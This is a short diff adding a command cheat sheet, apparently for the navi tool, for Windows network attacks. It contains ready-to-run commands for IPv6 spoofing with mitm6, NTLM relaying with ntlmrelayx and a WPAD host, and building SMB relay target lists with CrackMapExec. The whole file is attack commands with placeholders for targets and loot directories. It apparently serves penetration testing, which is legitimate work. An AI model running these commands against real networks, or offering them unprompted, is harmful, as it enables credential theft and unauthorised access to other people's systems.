@@ -1,0 +1,16 @@
+% ntlmrelay,mitm6,impacket,ntlm,adcs,relay,cme
+
+# MITM6: Spoof IPv6 and relay to targets
+mitm6 -d <domain.local>
+
+# NTLMRelayX with IPv6 and WPAD
+ntlmrelayx.py -6 -wh <wpad_host_ip> -t smb://<target_ip> -l <loot_dir>
+
+# Generate list of SMB relay targets (CME)
+cme smb <scope_file> --gen-relay-list <output_file>
+
+# Basic NTLM relay to single target
+impacket-ntlmrelayx -t <target> -smb2support
+
+# NTLM relay to multiple targets from file
+impacket-ntlmrelayx -tf <relay_targets_file> -smb2support
